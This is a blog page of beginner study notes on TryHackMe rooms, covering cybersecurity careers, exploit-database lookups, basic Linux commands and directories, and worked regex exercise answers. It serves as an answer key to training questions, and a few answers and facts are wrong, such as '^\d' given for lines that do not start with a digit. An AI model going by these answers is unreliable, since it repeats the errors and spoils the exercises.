<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>TryHackMe_1 | yake-daigua</title><meta name="keywords" content="PEN,THM"><meta name="author" content="yake-daigua"><meta name="copyright" content="yake-daigua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Complete Beginner IntroductionTutorialAccess machines via OpenVPN Starting Out In Cyber SecWhat is the name of the career role that is legally employed to find vulnerabilities in applications? penetra">
<meta property="og:type" content="article">
<meta property="og:title" content="TryHackMe_1">
<meta property="og:url" content="https://yake-daigua.top/2022/12/04/TryHackMe_1/index.html">
<meta property="og:site_name" content="yake-daigua">
<meta property="og:description" content="Complete Beginner IntroductionTutorialAccess machines via OpenVPN Starting Out In Cyber SecWhat is the name of the career role that is legally employed to find vulnerabilities in applications? penetra">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg">
<meta property="article:published_time" content="2022-12-04T12:08:57.000Z">
<meta property="article:modified_time" content="2022-12-04T12:17:53.084Z">
<meta property="article:author" content="yake-daigua">
<meta property="article:tag" content="PEN">
<meta property="article:tag" content="THM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg"><link rel="shortcut icon" href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg"><link rel="canonical" href="https://yake-daigua.top/2022/12/04/TryHackMe_1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TryHackMe_1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-12-04 20:17:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/mycss2.css"><link rel="stylesheet" href="/css/mycss3.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4201644.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yake-daigua</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">TryHackMe_1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-04T12:08:57.000Z" title="发表于 2022-12-04 20:08:57">2022-12-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-04T12:17:53.084Z" title="更新于 2022-12-04 20:17:53">2022-12-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PEN/">PEN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PEN/THM/">THM</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TryHackMe_1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Complete-Beginner-Introduction"><a href="#Complete-Beginner-Introduction" class="headerlink" title="Complete Beginner Introduction"></a>Complete Beginner Introduction</h1><h3 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h3><p>Access machines via <a target="_blank" rel="noopener" href="https://tryhackme.com/access?o=vpn">OpenVPN</a></p>
<h3 id="Starting-Out-In-Cyber-Sec"><a href="#Starting-Out-In-Cyber-Sec" class="headerlink" title="Starting Out In Cyber Sec"></a>Starting Out In Cyber Sec</h3><p>What is the name of the career role that is legally employed to find vulnerabilities in applications?</p>
<p>penetration tester</p>
<p>What is the name of the role who’s job is to identify attacks against an organisation?</p>
<p>security analyst</p>
<h3 id="Introductory-Researching"><a href="#Introductory-Researching" class="headerlink" title="Introductory Researching"></a>Introductory Researching</h3><p>As your experience level increases, you will find that the things you’re researching scale in their difficulty accordingly; however, in the field of information security, there will never come a point where you don’t need to look things up.</p>
<p>We will be looking at the following topics:<br>• An example of a research question<br>• Vulnerability Searching tools<br>• Linux Manual Pages</p>
<p>Learn how to use google.</p>
<p>You can find in three websites to exploit specific software.</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">ExploitDB</a></li>
<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/search">NVD</a></li>
<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/">CVE Mitre</a></li>
</ul>
<p>In kali such as: searchsploit fuel cms</p>
<p>When you want to use a inbuilding tool in kali. You can use a command: <code>man</code>.</p>
<p>Such as : <code>man ssh</code> (but I like to use <code>-h</code>)</p>
<p>Learn on google is the best way to learn.</p>
<h1 id="Linux-Fundamentals"><a href="#Linux-Fundamentals" class="headerlink" title="Linux Fundamentals"></a>Linux Fundamentals</h1><h3 id="Linux-Fundamentals-Part-1"><a href="#Linux-Fundamentals-Part-1" class="headerlink" title="Linux Fundamentals Part 1"></a>Linux Fundamentals Part 1</h3><p>Linux powers things such as:</p>
<ul>
<li>Websites that you visit</li>
<li>Car entertainment&#x2F;control panels</li>
<li>Point of Sale (PoS) systems such as checkout tills and registers in shops</li>
<li>Critical infrastructures such as traffic light controllers or industrial sensors</li>
</ul>
<p>What year was the first release of a Linux operating system? 1991</p>
<p>echo”TryHackMe”</p>
<p>echo TryhackMe</p>
<p>whoami</p>
<p>ls</p>
<p>cd</p>
<p>cat</p>
<p>pwd</p>
<p>find -name passwords.txt</p>
<p>find -name *.txt</p>
<p>wc -l access.log	&#x2F;&#x2F;Using “wc” to count the number of entries in “access.log”——-244 access.log</p>
<p>grep “81.143.211.90” access.log</p>
<table>
<thead>
<tr>
<th>Symbol &#x2F; Operator</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>This operator allows you to run commands in the <strong>background</strong> of your terminal.</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>This operator allows you to combine multiple commands together in one line of your terminal.However, it’s worth noting that <strong><code>command2</code> will only run if <code>command1</code> was successful.</strong></td>
</tr>
<tr>
<td>&gt;</td>
<td>This operator is a redirector - meaning that we can take the output from a command (such as using cat to output a file) and direct it elsewhere.</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>This operator does the same function of the <code>&gt;</code> operator but appends the output rather than replacing (meaning nothing is overwritten).</td>
</tr>
</tbody></table>
<p>echo password123 &gt; passwords</p>
<p>echo tryhackme &gt;&gt; passowrds</p>
<h3 id="Linux-Fundamentals-Part-2"><a href="#Linux-Fundamentals-Part-2" class="headerlink" title="Linux Fundamentals Part 2"></a>Linux Fundamentals Part 2</h3><p>ssh <a href="mailto:&#116;&#114;&#x79;&#x68;&#97;&#99;&#107;&#x40;&#49;&#x30;&#46;&#49;&#48;&#x2e;&#57;&#55;&#x2e;&#x32;&#x31;&#x38;">&#116;&#114;&#x79;&#x68;&#97;&#99;&#107;&#x40;&#49;&#x30;&#46;&#49;&#48;&#x2e;&#57;&#55;&#x2e;&#x32;&#x31;&#x38;</a></p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Full Name</th>
<th>Purpose</th>
</tr>
</thead>
<tbody><tr>
<td>touch</td>
<td>touch</td>
<td>Create file</td>
</tr>
<tr>
<td>mkdir</td>
<td>make directory</td>
<td>Create a folder</td>
</tr>
<tr>
<td>cp</td>
<td>copy</td>
<td>Copy a file or folder</td>
</tr>
<tr>
<td>mv</td>
<td>move</td>
<td>Move a file or folder</td>
</tr>
<tr>
<td>rm</td>
<td>remove</td>
<td>Remove a file or folder</td>
</tr>
<tr>
<td>file</td>
<td>file</td>
<td>Determine the type of a file</td>
</tr>
</tbody></table>
<p>Permissions</p>
<ul>
<li>Read</li>
<li>Write</li>
<li>Execute</li>
</ul>
<p>-rwxrw-r–</p>
<p>-:  file type</p>
<p>user group everyone</p>
<p>su users 		&#x2F;&#x2F;user2@linux2:&#x2F;home&#x2F;tryhackme$</p>
<p>su -l user2 	&#x2F;&#x2F;user2@:&#x2F;home&#x2F;user2$   ( -l :  –login)</p>
<p><a target="_blank" rel="noopener" href="https://upload-images.jianshu.io/upload_images/6943703-1f9b25194b773c5c.png">https://upload-images.jianshu.io/upload_images/6943703-1f9b25194b773c5c.png</a></p>
<p><strong>&#x2F;etc</strong></p>
<p>This root directory is one of the most important root directories on your system. The etc folder (short for etcetera) is a commonplace location to store system files that are used by your operating system. </p>
<p>For example, the sudoers file highlighted in the screenshot below contains a list of the users &amp; groups that have permission to run sudo or a set of commands as the root user.</p>
<p>Also highlighted below are the “<strong>passwd</strong>“ and “<strong>shadow</strong>“ files. These two files are special for Linux as they show how your system stores the passwords for each user in encrypted formatting called sha512.</p>
<p><strong>&#x2F;var</strong></p>
<p>The “&#x2F;var” directory, with “var” being short for variable data, is one of the main root folders found on a Linux install. This folder stores data that is frequently accessed or written by services or applications running on the system. For example, log files from running services and applications are written here (<strong>&#x2F;var&#x2F;log</strong>), or other data that is not necessarily associated with a specific user (i.e., databases and the like).</p>
<p>&#x2F;<strong>root</strong></p>
<p>Unlike the <strong>&#x2F;home</strong> directory, the <strong>&#x2F;root</strong> folder is actually the home for the “root” system user. There isn’t anything more to this folder other than just understanding that this is the home directory for the “root” user. But, it is worth a mention as the logical presumption is that this user would have their data in a directory such as “<strong>&#x2F;home&#x2F;root</strong>“ by default. </p>
<p><strong>&#x2F;tmp</strong></p>
<p>This is a unique root directory found on a Linux install. Short for “<strong>temporary</strong>“, the &#x2F;tmp directory is volatile and is used to store data that is only needed to be accessed once or twice. Similar to the memory on your computer, once the computer is restarted, the contents of this folder are cleared out.</p>
<p>What’s useful for us in pentesting is that any user can write to this folder by default. Meaning once we have access to a machine, it serves as a good place to store things like our enumeration scripts.</p>
<h3 id="Linux-Fundamentals-Part-3"><a href="#Linux-Fundamentals-Part-3" class="headerlink" title="Linux Fundamentals Part 3"></a>Linux Fundamentals Part 3</h3><p>nano</p>
<p>vim               &#x2F;&#x2F;use <code>/abc</code> and <code>?abc</code> to find string “abc”</p>
<p>wget url</p>
<p>scp important.txt <a href="mailto:&#x75;&#98;&#x75;&#x6e;&#x74;&#117;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#46;&#x33;&#x30;">&#x75;&#98;&#x75;&#x6e;&#x74;&#117;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#46;&#x33;&#x30;</a>:&#x2F;home&#x2F;ubuntu&#x2F;transferred.txt	&#x2F;&#x2F;using  ssh protocol to transfer</p>
<p>python3 -m http.server port</p>
<p>This module turns your computer into a quick and easy web server that you can use to serve your own files, where they can then be downloaded by another computing using commands such as <code>curl</code>and <code>wget</code>. </p>
<p>ps</p>
<p>Processes are the programs that are running on your machine. They are managed by the kernel, where each process will have an ID associated with it, also known as its PID. The PID increments for the order In which the process starts. I.e. the 60th process will have a PID of 60.</p>
<p>To see the processes run by other users and those that don’t run from a session (i.e. system processes), we need to provide <strong>aux</strong> to the <code>ps</code> command like so: <code>ps aux</code></p>
<p>Another great command to gain insight into your system is via the <code>top</code> command</p>
<p>kill pid</p>
<p>Below are some of the signals that we can send to a process when it is killed:</p>
<ul>
<li>SIGTERM - Kill the process, but allow it to do some cleanup tasks beforehand</li>
<li>SIGKILL - Kill the process - doesn’t do any cleanup after the fact</li>
<li>SIGSTOP - Stop&#x2F;suspend a process</li>
</ul>
<p>systemctl start apache2</p>
<p>systemctl enable myservice</p>
<p>Ctrl + Z : we can use <code>Ctrl + Z</code> on our keyboard to background a process.</p>
<p>fg : back to the  foreground</p>
<p>crontab : cron jobs</p>
<p><a target="_blank" rel="noopener" href="https://crontab-generator.org/">https://crontab-generator.org/</a></p>
<p>A crontab is simply a special file with formatting that is recognised by the <code>cron</code> process to execute each line step-by-step. Crontabs require 6 specific values:</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>MIN</td>
<td>What minute to execute at</td>
</tr>
<tr>
<td>HOUR</td>
<td>What hour to execute at</td>
</tr>
<tr>
<td>DOM</td>
<td>What day of the month to execute at</td>
</tr>
<tr>
<td>MON</td>
<td>What month of the year to execute at</td>
</tr>
<tr>
<td>DOW</td>
<td>What day of the week to execute at</td>
</tr>
<tr>
<td>CMD</td>
<td>The actual command that will be executed.</td>
</tr>
</tbody></table>
<p>crontab -e : Crontabs can be edited by using <code>crontab -e</code>, where you can select an editor (such as Nano) to edit your crontab.</p>
<p>apt install sublime-text</p>
<p>apt remove sublime-text</p>
<h3 id="Regular-expressions"><a href="#Regular-expressions" class="headerlink" title="Regular expressions"></a>Regular expressions</h3><p><strong>Note 1</strong>: Don’t confuse strings with charsets. The charset <code>[abc]</code> will match the string <code>abc</code>, but also <code>cba</code> and <code>ca</code>. It doesn’t match the string, but rather <strong>every occurrence</strong> of the specified characters in that string.</p>
<p>Then, there is a way to <strong>exclude</strong> characters from a charset with the <code>^</code> hat symbol, and include everything else.<br><code>[^k]ing</code> will match <code>ring</code>, <code>sing</code>, <code>$ing</code>, but not <code>king</code>.</p>
<p>Answer the questions below</p>
<p>Match all of the following characters: c, o, g</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[cog]</span><br></pre></td></tr></table></figure>

<p>Match all of the following words: cat, fat, hat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[cfh]at</span><br></pre></td></tr></table></figure>

<p>Match all of the following words: Cat, cat, Hat, hat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CcHh]at</span><br></pre></td></tr></table></figure>

<p>Match all of the following filenames: File1, File2, file3, file4, file5, File7, file9</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[fF]ile[1-9]</span><br></pre></td></tr></table></figure>

<p>Match all of the filenames of question 4, except “File7” (use the hat symbol)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[fF]ile[^7]</span><br></pre></td></tr></table></figure>

<p>The wildcard that is used to match any single character (except the line break) is the <code>.</code> dot. That means that <code>a.c</code> will match <code>aac</code>, <code>abc</code>, <code>a0c</code>, <code>a!c</code>, and so on.</p>
<p>Also, you can set a character as optional in your pattern using the <code>?</code> question mark. That means that <code>abc?</code> will match <code>ab</code> and <code>abc</code>, since the <code>c</code> is optional.Match all of the following words: Cat, fat, hat, rat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.at</span><br></pre></td></tr></table></figure>

<p>Match all of the following words: Cat, cats</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[cC]ats?</span><br></pre></td></tr></table></figure>

<p>Match the following domain name: cat.xyz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.cat\.xyz</span><br></pre></td></tr></table></figure>

<p>Match all of the following domain names: cat.xyz, cats.xyz, hats.xyz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ch]ats?\.xyz</span><br></pre></td></tr></table></figure>

<p>Match every 4-letter string that doesn’t end in any letter from n to z</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...[^n-z]</span><br></pre></td></tr></table></figure>

<p>Match bat, bats, hat, hats, but not rat or rats (use the hat symbol)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^r]ats?</span><br></pre></td></tr></table></figure>

<p>There are easier ways to match bigger charsets. For example, <code>\d</code> is used to match any <strong>single</strong> digit. Here’s a reference:<br><code>\d</code> matches a digit, like <code>9</code><br><code>\D</code> matches a non-digit, like <code>A</code> or <code>@</code><br><code>\w</code> matches an alphanumeric character, like <code>a</code> or <code>3</code><br><code>\W</code> matches a non-alphanumeric character, like <code>!</code> or <code>#</code><br><code>\s</code> matches a whitespace character (spaces, tabs, and line breaks)<br><code>\S</code> matches everything else (alphanumeric characters and symbols)</p>
<p><strong>Note: Underscores <code>_</code> are included in the <code>\w</code> metacharacter and not in <code>\W</code>. That means that <code>\w</code> will match every single character in <code>test_file</code>.</strong></p>
<p><code>&#123;12&#125;</code> - <strong>exactly 12</strong> times.<br><code>&#123;1,5&#125;</code> - <strong>1 to 5</strong> times.<br><code>&#123;2,&#125;</code> - <strong>2 or more</strong> times.<br><code>*</code> - <strong>0 or more</strong> times.<br><code>+</code> - <strong>1 or more</strong> times.</p>
<p>Match the following word: catssss</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cats&#123;4&#125;</span><br></pre></td></tr></table></figure>

<p>Match all of the following words (use the * sign): Cat, cats, catsss</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[cC]ats*</span><br></pre></td></tr></table></figure>

<p>Match all of the following sentences (use the + sign): regex go br, regex go brrrrrr</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regex go br+</span><br></pre></td></tr></table></figure>

<p>Match all of the following filenames: ab0001, bb0000, abc1000, cba0110, c0000 (don’t use a metacharacter)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[abc]&#123;1,3&#125;[01]&#123;4&#125;</span><br></pre></td></tr></table></figure>

<p>Match all of the following filenames: File01, File2, file12, File20, File99</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[fF]ile\d&#123;1,2&#125;</span><br></pre></td></tr></table></figure>

<p>Match all of the following folder names: kali tools, kali   tools</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali\s+tools</span><br></pre></td></tr></table></figure>

<p>Match all of the following filenames: notes~, stuff@, gtfob#, lmaoo!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\w&#123;5&#125;\W</span><br></pre></td></tr></table></figure>

<p>Match the string in quotes (use the * sign and the \s, \S metacharacters): “2f0h@f0j0%!   a)K!F49h!FFOK”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*\s*\S*</span><br></pre></td></tr></table></figure>

<p>Match every 9-character string (with letters, numbers, and symbols) that doesn’t end in a “!” sign</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S&#123;8&#125;[^!]</span><br></pre></td></tr></table></figure>

<p>Match all of these filenames (use the + symbol): .bash_rc, .unnecessarily_long_filename, and note1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\.?\w+            //use ? to match . or not </span><br></pre></td></tr></table></figure>

<p>Sometimes it’s very useful to specify that we want to search by a certain pattern <strong>in the beginning or the end of a line</strong>. We do that with these characters:<br><code>^</code> - starts with<br><code>$</code> - ends with</p>
<p>Note: The <code>^</code> hat symbol is used to exclude a charset when enclosed in <code>[</code>square brackets<code>]</code>, but when it is not, it is used to specify the beginning of a word.</p>
<p>You can also define groups by enclosing a pattern in <code>(</code>parentheses<code>)</code>. This function can be used for many ways that are not in the scope of this tutorial. We will use it to define an <strong>either&#x2F; or</strong> pattern, and also to repeat patterns. To say “or” in Regex, we use the <code>|</code> pipe.</p>
<p>For an “either&#x2F;or” pattern example, the pattern <code>during the (day|night)</code> will match both of these sentences: <code>during the day</code> and <code>during the night</code>.<br>For a repetition example, the pattern <code>(no)&#123;5&#125;</code> will match the sentence <code>nonononono</code>.</p>
<p>Match every string that starts with “Password:” followed by any 10 characters excluding “0”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^Password:[^0]&#123;10&#125;</span><br></pre></td></tr></table></figure>

<p>Match “username: “ in the beginning of a line (note the space!)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^username:\s</span><br></pre></td></tr></table></figure>

<p>Match every line that doesn’t start with a digit (use a metacharacter)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\d</span><br></pre></td></tr></table></figure>

<p>Match this string at the end of a line: EOF$</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EOF\$$</span><br></pre></td></tr></table></figure>

<p>Match all of the following sentences:</p>
<ul>
<li>I use nano</li>
<li>I use vim</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I use (nano|vim)</span><br></pre></td></tr></table></figure>

<p>Match all lines that start with $, followed by any single digit,<br>followed by $, followed by one or more non-whitespace characters</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^\$\d\$\S+</span><br></pre></td></tr></table></figure>

<p>Match every possible IPv4 IP address (use metacharacters and groups)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;</span><br></pre></td></tr></table></figure>

<p>Match all of these emails while also adding the username and the domain name (not the TLD) in separate groups (use \w): <code>[hello@tryhackme.com](mailto:hello@tryhackme.com), [username@domain.com](mailto:username@domain.com), [dummy_email@xyz.com](mailto:dummy_email@xyz.com)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\w+)@(\w+)\.com</span><br></pre></td></tr></table></figure>

